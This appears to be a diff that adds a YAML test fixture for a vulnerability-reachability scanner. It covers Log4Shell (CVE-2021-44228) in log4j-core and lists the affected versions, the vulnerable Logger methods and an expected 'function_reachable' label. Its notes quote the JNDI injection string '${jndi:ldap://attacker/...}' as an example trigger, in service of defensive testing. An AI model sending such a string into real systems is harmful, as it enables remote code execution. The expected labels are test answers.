@@ -1,0 +1,25 @@
+fixture_type: cve_reachability
+cve_id: CVE-2021-44228
+ghsa_id: GHSA-jfh8-c2jp-5v3q
+package: org.apache.logging.log4j:log4j-core
+import_names: [org.apache.logging.log4j]
+ecosystem: maven
+affected_versions: ">=2.0-beta9,<2.15.0"
+language: java
+expected_reachable: true
+expected_label: function_reachable
+transitive_only: false
+vulnerable_symbols:
+  - org.apache.logging.log4j.Logger.error
+  - org.apache.logging.log4j.Logger.info
+  - org.apache.logging.log4j.Logger.warn
+  - org.apache.logging.log4j.Logger.fatal
+notes: |
+  Log4Shell — JNDI lookup substitution in any Logger method that
+  evaluates message strings.  Trigger is `Logger.error(userInput)`
+  where userInput contains `${jndi:ldap://attacker/...}`.  Affects
+  every level method that interpolates the message.
+
+  Fixture uses a plain service class (no framework annotations) to
+  isolate the symbol-resolution test from any controller / route
+  detection logic.
